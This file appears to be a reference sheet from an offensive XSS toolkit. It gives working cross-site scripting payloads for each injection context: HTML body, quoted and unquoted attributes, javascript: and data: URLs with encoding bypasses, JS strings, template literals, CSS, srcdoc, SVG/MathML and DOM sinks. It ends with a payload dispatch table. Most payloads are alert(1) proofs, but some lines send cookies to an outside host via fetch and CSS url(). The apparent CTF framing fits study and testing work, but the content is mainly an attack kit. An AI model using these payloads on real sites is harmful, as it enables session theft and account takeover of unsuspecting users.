# Context grammar — where the value lands and what runs there

Every XSS context has its own escape vocabulary. This file is the
grammar per context: what the parser accepts, what closes it, and
what executes. `detection.md` tells you WHICH context; this file
tells you what that context allows.

---

## 1. HTML body (markup context)

`<div>{v}</div>` — full HTML parsed. Any tag + event combination
that fires without user interaction:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>x</marquee>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

`events.md` has the full tag×handler matrix.

Parser notes:

- `<script>` needs `</script>` to close — unclosed breaks page.
- `<noscript>` parses as markup only when scripting disabled.
- `<title>`/`<textarea>` are RCDATA — markup inside is text until
  `</title>`/`</textarea>` — escape needs the closing tag first:
  `</title><img src=x onerror=alert(1)>`
- `<iframe srcdoc="...">` is a nested document — the injected
  value lands as a whole page (see §9).
- `<template>` contents are inert — won't render until JS clones
  them.

---

## 2. Attribute — quoted value

`<div title="{v}">` — the value is inside a quoted attribute.
Two moves: break out (add a new attribute/tag) or stay inside
(URL/event values).

Breakout:

```html
" onmouseover="alert(1)            -- title="x" onmouseover="alert(1)"
" autofocus onfocus="alert(1)       -- auto-focus + handler
"><img src=x onerror=alert(1)>      -- escape the tag entirely
" style="animation-name:x" onanimationstart="alert(1)
```

Same with `'` for single-quoted attrs. Unquoted attrs break on
space: `x onmouseover=alert(1)`.

Which handlers auto-fire (no interaction): `onload` (on capable
tags), `onerror` (on resource tags), `onfocus` (with `autofocus`),
`ontoggle` (details open), `onanimationstart` (with a style that
starts an animation), `ontransitionrun`, `onbegin` (SMIL).

---

## 3. Attribute — URL-bearing (href/src/action)

`<a href="{v}">` — the value IS a URL. Scheme injection:

```html
javascript:alert(1)
javascript:alert(document.domain)
JaVaScRiPt:alert(1)
java\tscript:alert(1)           -- tab inside scheme (some parsers)
java\nscript:alert(1)
javascript://comment%0aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)              -- IE only
```

The catch: `javascript:`/`data:` schemes often filtered — encode:

```html
&#106;avascript:alert(1)         -- entity the browser decodes
&#x6a;avascript:alert(1)         -- hex entity
jav&#x09;ascript:alert(1)        -- tab inside scheme name
java&Tab;script:alert(1)
&NewLine;avascript:alert(1)
javascript&colon;alert(1)
%6aavascript:alert(1)            -- if URL-decoded once before render
```

Requires a click usually — unless you can also inject `id` +
anchor-target or autofocus-scroll tricks (`filter-bypass.md`).

---

## 4. JavaScript string context

`<script>var x="{v}";</script>` — inside a JS string literal.
Two moves: terminate the string or terminate the script.

String break:

```javascript
";alert(1);//                    -- var x="";alert(1);//";
"-alert(1)-"                     -- expression: x=""-alert(1)-""
"+alert(1)+"                     -- concat-eval shape
';alert(1);//                    -- single-quote variant
\';alert(1);//                   -- escape-then-break (if \ filtered)
";alert(1)//
");alert(1);//                   -- paren-close too
```

Script-element break (works regardless of JS validity):

```javascript
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
</ScRiPt><img src=x onerror=alert(1)>   -- some filters miss case
</script%20><img ...>                     -- whitespace variants
</script/x><img ...>
```

The `</script>` close works even inside a string — the HTML parser
doesn't care about JS string state.

---

## 5. Template literal context

`<script>var t=`${v}`;</script>` — inside backticks. The eval
context: `${}` expressions EVALUATE inside the template:

```javascript
${alert(1)}                       -- var t=`${${alert(1)}}`
${`${alert(1)}`}                   -- nested template
`+alert(1)+`                      -- concat break
`-alert(1)-`                      -- arithmetic break
`;alert(1);//                     -- terminate then run
`;alert(1)`                       -- no comment needed
${fetch`//me/${document.cookie}`}  -- tagged-template exfil
```

Evaluates BEFORE any DOM sanitizer — SKILL.md calls this its own
context for a reason: DOMPurify never sees the result of `${}`.

---

## 6. JSON-in-script / data island

`<script>var d={"k":"{v}"};</script>` or `<script type="application/json">{"k":"{v}"}</script>`:

```javascript
"};alert(1);//                   -- object close then statement
"};alert(1);var x={"y":"         -- balanced variant
"</script><img src=x onerror=alert(1)>"  -- raw script close
```

`type="application/json"` blocks don't EXECUTE — but if JS later
`JSON.parse`/`eval`s them, breaking the JSON still reaches the
eval path. And `</script>` inside the JSON still ends the element.

---

## 7. CSS context

`<div style="color:{v}">` or `<style>body{...{v}...}</style>`:

CSS code-exec is mostly dead (expression() was IE-only), but CSS
can still: exfiltrate via `url()`, hijack clicks via overlays,
extract data via attribute selectors + `url()` callbacks:

```css
/* exfil via background url */
x;background:url('//me/?c='+cookie)       -- if vars concat... rare
/* the classic attribute-selector exfil — needs the selector in
   the page already; injection sets the URL: */
input[value^='f']{background:url(//me/f)}
/* overlay attacks — a fullscreen invisible link/button: */
x;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;
   background:rgba(0,0,0,0);cursor:pointer;
/* break the style attribute into events */
x" onmouseover="alert(1)                 -- attr breakout wins
</style><img src=x onerror=alert(1)>     -- escape the block
```

Realistic CTF path: CSS injection → click-jacking overlay or
data exfil via selector+url — not alert().

---

## 8. URL context (meta refresh / location / iframe src)

```html
<meta http-equiv="refresh" content="0;url={v}">
<iframe src="{v}">
<script>location="{v}"</script>
<a href="{v}">
```

`javascript:`/`data:`/attacker-controlled `https:` URLs all apply —
same as §3. Meta refresh inside the page body still redirects in
most browsers.

---

## 9. srcdoc / nested document

`<iframe srcdoc="{v}">` — the attribute value IS a full HTML
document:

```html
&quot;<script>alert(1)</script>          -- entity-encoded inside attr
<script>alert(1)</script>                -- if the attr is unquoted
'<script>alert(1)</script>'               -- single-quoted srcdoc
x" ><script>alert(1)</script>            -- malformed breakout
<script>alert(parent.document.domain)</script>  -- parent access
```

The srcdoc document is same-origin unless `sandbox` — script in it
reads the parent's DOM/cookies. `sandbox="allow-scripts"` + no
`allow-same-origin` = opaque origin — cookies out, DOM out, but
`alert` still proves code exec.

---

## 10. Comment / conditional context

`<!-- {v} -->`:

```html
--><img src=x onerror=alert(1)><!--       -- escape the comment
--!><img src=x onerror=alert(1)>          -- abrupt-close variant
><img src=x onerror=alert(1)>             -- some parsers end early
```

IE conditional comments: `<!--[if IE]>...<![endif]-->` — dead but
shows the shape.

---

## 11. RCDATA contexts — textarea / title / plaintext / xmp / iframe(no srcdoc)

```html
</title><img src=x onerror=alert(1)>      -- escape RCDATA first
</textarea><script>alert(1)</script>
</textarea><svg onload=alert(1)>
```

`plaintext`/`xmp`/`iframe`/`noembed`/`noframes`/`listing` — raw
text: the closing tag is the only escape:

```html
</xmp><img src=x onerror=alert(1)>
</plaintext><script>alert(1)</script>
```

`noscript` — content renders only when scripting OFF; if the
injection lands inside noscript and the bot has scripting ON,
it's inert — skip it.

---

## 12. SVG / MathML — XML-in-HTML

`<svg>{v}</svg>` — SVG is XML parsed inside HTML:

```html
<svg onload=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text
  x=20 y=20>click</text></a></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><handler>alert(1)</handler>                        -- old SVG
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>
<math><a xlink:href=javascript:alert(1)>x</a></math>
<svg><script>alert(1)</script></svg>                    -- svg <script>
<svg><use href="data:image/svg+xml,...">                -- nested svg
```

The foreignObject tag switches back to HTML parsing — hybrid
payloads live there (`mutation-xss.md` §3).

---

## 13. The attribute→event injection grammar

When you can add attributes but not tags (attr breakout §2), the
auto-firing set:

```html
" autofocus onfocus="alert(1)          -- needs autofocus-capable tag
" style="animation-name:x" onanimationstart="alert(1)   -- needs anim
" tabindex="1" onfocus="alert(1)       -- focus needs help
" accesskey="x" onclick="alert(1)      -- needs keystroke — not auto
" contenteditable="true" onfocus="alert(1)  -- makes any tag focusable
```

Tag-locked autofocus: only `<input> <select> <textarea> <button>
<keygen> <video> <audio>` honour autofocus on most browsers. On a
`<div>`, add `contenteditable` + `onfocus`.

---

## 14. DOM-only contexts — value lives only in JS

When the value never hits the HTML — it's a JS variable assigned
to a sink:

```javascript
// sources → sinks (dom-xss.md is the full matrix)
el.innerHTML = '{v}';               -- markup context again
el.innerHTML = location.hash;        -- hash is your input
eval('{v}');                         -- code context
setTimeout('{v}',100);               -- code context
new Function('{v}')();               -- code context
location.hash='{v}';                 -- URL context
document.write('{v}');               -- markup context
$(el).html('{v}');                   -- markup (jQuery)
```

Code contexts accept any JS — `alert(1)` or the real payload
directly, no escaping beyond the string wrap.

---

## 15. The context → payload dispatch

| Context | First payload |
|---|---|
| HTML body | `<img src=x onerror=alert(1)>` |
| attr-quoted | `" autofocus onfocus="alert(1)` (input) or `"><img...` |
| attr-unquoted | `x onmouseover=alert(1)` (needs hover) or `x><img...` |
| href/src | `javascript:alert(1)` |
| js-string | `";alert(1);//` or `</script><img...>` |
| template-lit | `${alert(1)}` |
| json-in-script | `"};alert(1);//` or `</script>...` |
| css | `x" onmouseover="alert(1)` (breakout) |
| srcdoc | `&quot;<script>alert(1)</script>` |
| rcdata | `</title><img src=x onerror=alert(1)>` |
| comment | `--><img src=x onerror=alert(1)>` |
| svg | `<svg onload=alert(1)>` |
| dom-code | `alert(1)` |
| dom-markup | `<img src=x onerror=alert(1)>` |
